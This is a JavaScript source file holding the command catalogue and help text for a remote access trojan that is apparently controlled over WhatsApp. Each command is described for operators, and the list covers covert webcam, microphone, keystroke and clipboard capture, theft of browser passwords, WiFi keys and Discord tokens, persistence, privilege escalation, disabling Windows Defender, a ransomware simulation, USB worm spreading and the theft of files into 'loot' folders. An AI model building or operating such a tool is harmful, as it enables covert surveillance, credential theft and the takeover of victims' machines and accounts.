/**
 * Command Metadata System
 * Centralized command definitions with descriptions, usage, and help
 */

export const COMMAND_METADATA = {
  // ═══════════════════════════════════════════════════════════════
  // SURVEILLANCE COMMANDS
  // ═══════════════════════════════════════════════════════════════
  surveillance: {
    category: 'surveillance',
    categoryName: '📸 SURVEILLANCE',
    categoryEmoji: '📸',
    description: 'Real-time monitoring and data capture',
    commands: {
      screenshot: {
        name: 'screenshot',
        aliases: ['ss'],
        emoji: '📸',
        category: 'surveillance',
        shortDesc: 'Capture target screen',
        fullDesc: `Captures a screenshot of the target system's desktop.
        
Uses MSS library for fast, high-quality screen capture.
Returns image in base64 format for WhatsApp delivery.
Automatically saved to: captures/screenshots/`,
        usage: '/screenshot',
        example: '/ss',
        timeout: 30000,
        danger: false,
      },
      webcam: {
        name: 'webcam',
        aliases: ['cam'],
        emoji: '📷',
        category: 'surveillance',
        shortDesc: 'Activate target webcam',
        fullDesc: `Captures a photo from the target's webcam/camera.
        
Uses OpenCV for camera access.
Requires camera to be available on target.
Returns JPEG image for fast delivery.
Automatically saved to: captures/webcam/`,
        usage: '/webcam',
        example: '/cam',
        timeout: 30000,
        danger: false,
      },
      keylogs: {
        name: 'keylogs',
        aliases: ['keys'],
        emoji: '⌨️',
        category: 'surveillance',
        shortDesc: 'Retrieve keystroke logs',
        fullDesc: `Fetches captured keystrokes from the target system.
        
Includes timestamps and context of where keys were typed.
Shows all text input across the entire system.
Warning: May contain sensitive information like passwords.
Automatically saved to: loot/`,
        usage: '/keylogs',
        example: '/keys',
        timeout: 15000,
        danger: false,
      },
      record: {
        name: 'record',
        aliases: ['rec', 'audio'],
        emoji: '🎤',
        category: 'surveillance',
        shortDesc: 'Record audio from target microphone',
        fullDesc: `Records audio from the target system's microphone.
        
Duration in seconds (default: 10).
Uses PyAudio for microphone capture.
Returns WAV format audio file.
Higher duration = longer wait time.
Automatically saved to: captures/audio/`,
        usage: '/record [duration]',
        example: '/record 5',
        timeout: null, // Dynamic based on duration
        danger: false,
      },
      clipboard: {
        name: 'clipboard',
        aliases: ['clip'],
        emoji: '📋',
        category: 'surveillance',
        shortDesc: 'Monitor clipboard content',
        fullDesc: `Retrieves clipboard history from the target.
        
Shows all items copied/pasted on the system.
Includes timestamps for each clipboard entry.
Useful for finding sensitive data (passwords, tokens, etc).
Automatically saved to: loot/`,
        usage: '/clipboard',
        example: '/clip',
        timeout: 10000,
        danger: false,
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════
  // CREDENTIAL COMMANDS
  // ═══════════════════════════════════════════════════════════════
  credentials: {
    category: 'credentials',
    categoryName: '🔐 CREDENTIALS',
    categoryEmoji: '🔐',
    description: 'Password and token harvesting',
    commands: {
      passwords: {
        name: 'passwords',
        aliases: ['pass', 'pwd'],
        emoji: '🔐',
        category: 'credentials',
        shortDesc: 'Extract browser passwords',
        fullDesc: `Harvests stored passwords from target browsers.
        
Supports: Chrome, Edge, Firefox
Uses DPAPI decryption for secure password storage.
Includes: URLs, usernames, passwords.
Warning: Contains highly sensitive information.
Automatically saved to: loot/{target}/browser_passwords_*.json`,
        usage: '/passwords',
        example: '/pass',
        timeout: 30000,
        danger: true,
      },
      wifi: {
        name: 'wifi',
        aliases: ['network', 'wlan'],
        emoji: '📡',
        category: 'credentials',
        shortDesc: 'Extract WiFi network passwords',
        fullDesc: `Extracts saved WiFi network passwords from target.
        
Uses: netsh wlan show profile key=clear
Shows: SSID and password for each saved network.
Allows lateral movement in target's network.
Warning: Network access compromise.
Automatically saved to: loot/{target}/wifi_passwords_*.json`,
        usage: '/wifi',
        example: '/wifi',
        timeout: 15000,
        danger: true,
      },
      discord: {
        name: 'discord',
        aliases: ['token', 'tokens'],
        emoji: '🎮',
        category: 'credentials',
        shortDesc: 'Steal Discord authentication tokens',
        fullDesc: `Harvests Discord bot/user tokens from target.
        
Extracts from: Discord cache, browser storage, config files.
Tokens can be used to: impersonate user, access servers, steal data.
Warning: Account takeover risk.
Automatically saved to: loot/{target}/discord_tokens_*.json`,
        usage: '/discord',
        example: '/discord',
        timeout: 15000,
        danger: true,
      },
      history: {
        name: 'history',
        aliases: ['hist', 'browse'],
        emoji: '📜',
        category: 'credentials',
        shortDesc: 'Extract browser visit history',
        fullDesc: `Retrieves browser history from target system.
        
Supports: Chrome, Edge (Firefox limited).
Shows: Visited URLs, titles, timestamps.
Top 15 most recent visits displayed.
Useful for: profiling target behavior and interests.
Automatically saved to: loot/{target}/`,
        usage: '/history [chrome|edge]',
        example: '/history chrome',
        timeout: 20000,
        danger: false,
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════
  // SYSTEM COMMANDS
  // ═══════════════════════════════════════════════════════════════
  system: {
    category: 'system',
    categoryName: '⚙️ SYSTEM',
    categoryEmoji: '⚙️',
    description: 'System information and control',
    commands: {
      sysinfo: {
        name: 'sysinfo',
        aliases: ['info', 'sys'],
        emoji: '💻',
        category: 'system',
        shortDesc: 'Display system information',
        fullDesc: `Retrieves comprehensive system information.
        
Includes:
  • OS version (Windows 10/11)
  • CPU information
  • RAM amount
  • Disk space
  • Network info
  • User account details
  
Useful for: target profiling and capability assessment.`,
        usage: '/sysinfo',
        example: '/info',
        timeout: 15000,
        danger: false,
      },
      processes: {
        name: 'processes',
        aliases: ['proc', 'ps'],
        emoji: '⚙️',
        category: 'system',
        shortDesc: 'List running processes',
        fullDesc: `Shows all running processes on target system.
        
Displays: PID, process name, memory usage.
Top 20 most resource-intensive processes shown.
Useful for: finding security software, target analysis.
Examples: svchost.exe, explorer.exe, defender processes.`,
        usage: '/processes',
        example: '/proc',
        timeout: 20000,
        danger: false,
      },
      metrics: {
        name: 'metrics',
        aliases: ['stats', 'perf'],
        emoji: '📊',
        category: 'system',
        shortDesc: 'Get system performance metrics',
        fullDesc: `Real-time system performance information.
        
Shows:
  • CPU usage percentage
  • RAM used/total
  • Disk usage
  • Network traffic
  • System uptime
  
Useful for: assessing system load and health.`,
        usage: '/metrics',
        example: '/stats',
        timeout: 10000,
        danger: false,
      },
      killproc: {
        name: 'killproc',
        aliases: ['kill', 'terminate'],
        emoji: '🔌',
        category: 'system',
        shortDesc: 'Kill a running process',
        fullDesc: `Terminates a process by PID.
        
Warning: Can crash system if critical process killed.
Examples: 
  • Security software processes
  • Applications
  • System services
  
Safe targets: notepad.exe, calculator.exe
Dangerous: svchost.exe, explorer.exe, kernel processes`,
        usage: '/killproc <PID>',
        example: '/killproc 1234',
        timeout: 10000,
        danger: true,
      },
      software: {
        name: 'software',
        aliases: ['apps', 'installed'],
        emoji: '📦',
        category: 'system',
        shortDesc: 'List installed programs',
        fullDesc: `Enumerates all installed software.
        
Shows: Program names, versions, installation paths.
Top 20 programs displayed.
Useful for: identifying security software, finding targets.
Can detect: Antivirus, firewalls, EDR tools, VPNs.`,
        usage: '/software',
        example: '/apps',
        timeout: 60000,
        danger: false,
      },
      netscan: {
        name: 'netscan',
        aliases: ['scan', 'network'],
        emoji: '🌐',
        category: 'system',
        shortDesc: 'Scan local network',
        fullDesc: `Performs ARP sweep of local network.
        
Discovers: Active hosts on same network.
Shows: IP addresses, MAC addresses.
Useful for: lateral movement planning, target enumeration.
Can find: Servers, workstations, IoT devices.`,
        usage: '/netscan',
        example: '/scan',
        timeout: 60000,
        danger: false,
      },
      locate: {
        name: 'locate',
        aliases: ['geo', 'location'],
        emoji: '🌍',
        category: 'system',
        shortDesc: 'Get geolocation of target',
        fullDesc: `Determines physical location of target.
        
Methods:
  • IP-based geolocation
  • GPS data (if available)
  • WiFi triangulation
  
Returns: Latitude, longitude, city, country.
Useful for: physical security assessment, tracking.`,
        usage: '/locate',
        example: '/geo',
        timeout: 10000,
        danger: false,
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════
  // FUN/ADVANCED COMMANDS
  // ═══════════════════════════════════════════════════════════════
  fun: {
    category: 'fun',
    categoryName: '🎮 ADVANCED',
    categoryEmoji: '🎮',
    description: 'Fun, pranks, and dangerous operations',
    commands: {
      msgbox: {
        name: 'msgbox',
        aliases: ['msg', 'box'],
        emoji: '💬',
        category: 'fun',
        shortDesc: 'Show message box on target',
        fullDesc: `Displays a popup message on target screen.
        
Uses Windows MessageBox API.
User cannot dismiss until they click OK.
Useful for: pranks, social engineering, control demonstration.
Example: "Your computer has been hacked!"`,
        usage: '/msgbox <message>',
        example: '/msgbox Your PC is monitored',
        timeout: 5000,
        danger: false,
      },
      beep: {
        name: 'beep',
        aliases: ['sound', 'alarm'],
        emoji: '🔊',
        category: 'fun',
        shortDesc: 'Play system sound',
        fullDesc: `Plays a beep sound on target system.
        
Parameters:
  • Frequency: 1-20000 Hz (default: 1000)
  • Duration: milliseconds (default: 500)
  
Examples:
  /beep - standard beep
  /beep 2000 1000 - higher pitch, 1 second`,
        usage: '/beep [frequency] [duration]',
        example: '/beep 1000 500',
        timeout: 5000,
        danger: false,
      },
      lock: {
        name: 'lock',
        aliases: ['lockscreen', 'block'],
        emoji: '🔒',
        category: 'fun',
        shortDesc: 'Lock target workstation',
        fullDesc: `Locks the target user's workstation.
        
Windows shows login screen.
User must enter password to unlock.
Does not sign out - just locks display.
Useful for: denying access, forcing authentication.`,
        usage: '/lock',
        example: '/lock',
        timeout: 5000,
        danger: true,
      },
      shutdown: {
        name: 'shutdown',
        aliases: ['shutdown', 'reboot'],
        emoji: '🔴',
        category: 'fun',
        shortDesc: 'Shutdown or restart system',
        fullDesc: `Initiates system shutdown or restart.
        
Default: 60 second countdown before shutdown.
User will see shutdown notification.
Can be cancelled by user (unless forced).
Useful for: denying access, cleanup, disruption.
        
⚠️ WARNING: Highly disruptive operation!`,
        usage: '/shutdown [delay_seconds]',
        example: '/shutdown 30',
        timeout: 5000,
        danger: true,
      },
      persist: {
        name: 'persist',
        aliases: ['install', 'persistence'],
        emoji: '📌',
        category: 'fun',
        shortDesc: 'Install persistence mechanism',
        fullDesc: `Establishes persistence on target system.
        
Methods:
  • Registry Run key
  • Startup folder
  • Scheduled tasks (if admin)
  
Ensures RAT survives system reboot.
Runs every time user logs in.
        
⚠️ WARNING: Makes infection permanent!`,
        usage: '/persist',
        example: '/persist',
        timeout: 20000,
        danger: true,
      },
      elevate: {
        name: 'elevate',
        aliases: ['admin', 'privilege'],
        emoji: '🚀',
        category: 'fun',
        shortDesc: 'Escalate to admin privileges',
        fullDesc: `Attempts privilege escalation to SYSTEM/ADMIN.
        
Methods:
  • UAC bypass
  • Token impersonation
  • Service exploitation
  
If successful: full system control.
If fails: continues as regular user.
        
⚠️ WARNING: Privilege escalation!`,
        usage: '/elevate',
        example: '/elevate',
        timeout: 20000,
        danger: true,
      },
      defenderoff: {
        name: 'defenderoff',
        aliases: ['disable', 'noav'],
        emoji: '🛡️',
        category: 'fun',
        shortDesc: 'Disable Windows Defender',
        fullDesc: `Disables Windows Defender antivirus.
        
Attempts:
  • Real-time protection disable
  • IOAV protection disable
  • Behavior monitoring disable
  
Requires admin privileges.
May be blocked by policies.
        
⚠️ WARNING: Removes security protection!`,
        usage: '/defenderoff',
        example: '/defenderoff',
        timeout: 15000,
        danger: true,
      },
      ransom: {
        name: 'ransom',
        aliases: ['encrypt', 'ransomware'],
        emoji: '⚠️',
        category: 'fun',
        shortDesc: 'Simulate ransomware encryption',
        fullDesc: `Simulates ransomware by renaming files.
        
Renames files in target directory to .LOCKED
Does NOT actually encrypt (for demo purposes).
Changes desktop wallpaper to ransom message.
Shows "ransom" message on screen.
        
⚠️⚠️ EXTREME WARNING:
This simulates ransomware behavior!
Only for authorized testing!
Can cause data loss if not careful!`,
        usage: '/ransom <path>',
        example: '/ransom C:\\Users\\Documents',
        timeout: 60000,
        danger: true,
      },
      spread: {
        name: 'spread',
        aliases: ['usb', 'worm'],
        emoji: '💾',
        category: 'fun',
        shortDesc: 'Spread to USB drives',
        fullDesc: `Spreads RAT to connected USB drives.
        
Copies payload to all USB devices.
Creates autorun.inf for auto-execution.
Propagates when USB inserted on other systems.
        
⚠️ WARNING: Worm-like propagation!`,
        usage: '/spread',
        example: '/spread',
        timeout: 30000,
        danger: true,
      },
      selfdestruct: {
        name: 'selfdestruct',
        aliases: ['cleanup', 'delete'],
        emoji: '💥',
        category: 'fun',
        shortDesc: 'Clean traces and uninstall',
        fullDesc: `Removes all traces of RAT from system.
        
Cleans:
  • Registry keys
  • Temporary files
  • Logs
  • Installed files
  
Final action: RAT terminates.
Connection lost after execution.
        
⚠️ WARNING: Cannot reconnect after this!`,
        usage: '/selfdestruct',
        example: '/selfdestruct',
        timeout: 10000,
        danger: true,
      },
      download: {
        name: 'download',
        aliases: ['dl', 'get'],
        emoji: '📥',
        category: 'fun',
        shortDesc: 'Download file from target',
        fullDesc: `Downloads a file from target system.
        
Reads any file accessible to user.
Useful for: stealing documents, configs, data.
Returns file as WhatsApp media/document.
Saved to: loot/{target}/`,
        usage: '/download <filepath>',
        example: '/download C:\\Users\\user\\important.txt',
        timeout: 60000,
        danger: true,
      },
    },
  },

  // ═══════════════════════════════════════════════════════════════
  // MANAGEMENT COMMANDS
  // ═══════════════════════════════════════════════════════════════
  management: {
    category: 'management',
    categoryName: '🎯 MANAGEMENT',
    categoryEmoji: '🎯',
    description: 'Session and bot management',
    commands: {
      sessions: {
        name: 'sessions',
        aliases: ['list', 'ls'],
        emoji: '🎯',
        category: 'management',
        shortDesc: 'List active sessions',
        fullDesc: `Shows all connected target systems.
        
Displays:
  • Session ID
  • Target IP address
  • System info
  • Connection time
  
Use /use <id> to interact with a session.`,
        usage: '/sessions',
        example: '/list',
        timeout: 5000,
        danger: false,
      },
      use: {
        name: 'use',
        aliases: ['select', 'switch'],
        emoji: '🎯',
        category: 'management',
        shortDesc: 'Switch to a session',
        fullDesc: `Activates a specific target session.
        
All subsequent commands run on this target.
Shows which session is active.
Switch anytime with /use <id>.`,
        usage: '/use <session_id>',
        example: '/use 1',
        timeout: 5000,
        danger: false,
      },
      help: {
        name: 'help',
        aliases: ['?', 'h'],
        emoji: '❓',
        category: 'management',
        shortDesc: 'Show help menu',
        fullDesc: `Displays command help system.
        
Options:
  /help - Main menu with all commands
  /help -category - Commands in category
  /help -screenshot - Detailed help for command
  
Use category menu to browse by type.
Detailed help shows usage and examples.`,
        usage: '/help [command|-category]',
        example: '/help -screenshot',
        timeout: 5000,
        danger: false,
      },
      menu: {
        name: 'menu',
        aliases: ['nav', 'commands'],
        emoji: '📑',
        category: 'management',
        shortDesc: 'Show command categories',
        fullDesc: `Navigation menu with command categories.
        
Categories:
  • 📸 Surveillance
  • 🔐 Credentials
  • ⚙️ System
  • 🎮 Advanced
  
Select category to see commands.`,
        usage: '/menu',
        example: '/menu',
        timeout: 5000,
        danger: false,
      },
    },
  },
};

/**
 * Get command by name or alias
 */
export function getCommand(input) {
  const search = input.toLowerCase().trim();
  
  for (const category of Object.values(COMMAND_METADATA)) {
    if (!category.commands) continue;
    
    for (const [cmdName, cmdData] of Object.entries(category.commands)) {
      if (cmdName === search) return cmdData;
      if (cmdData.aliases && cmdData.aliases.includes(search)) {
        return cmdData;
      }
    }
  }
  
  return null;
}

/**
 * Get all commands in a category
 */
export function getCommandsByCategory(categoryName) {
  const cat = Object.values(COMMAND_METADATA).find(
    c => c.category === categoryName.toLowerCase()
  );
  
  if (!cat || !cat.commands) return null;
  
  return Object.values(cat.commands);
}

/**
 * Get all categories
 */
export function getAllCategories() {
  return Object.values(COMMAND_METADATA)
    .filter(cat => cat.commands)
    .map(cat => ({
      name: cat.category,
      emoji: cat.categoryEmoji,
      displayName: cat.categoryName,
      description: cat.description,
      commandCount: Object.keys(cat.commands).length,
    }));
}

/**
 * Get total command count
 */
export function getTotalCommandCount() {
  let count = 0;
  for (const category of Object.values(COMMAND_METADATA)) {
    if (category.commands) {
      count += Object.keys(category.commands).length;
    }
  }
  return count;
}

/**
 * Get all commands flattened
 */
export function getAllCommands() {
  const commands = [];
  for (const category of Object.values(COMMAND_METADATA)) {
    if (category.commands) {
      commands.push(...Object.values(category.commands));
    }
  }
  return commands;
}
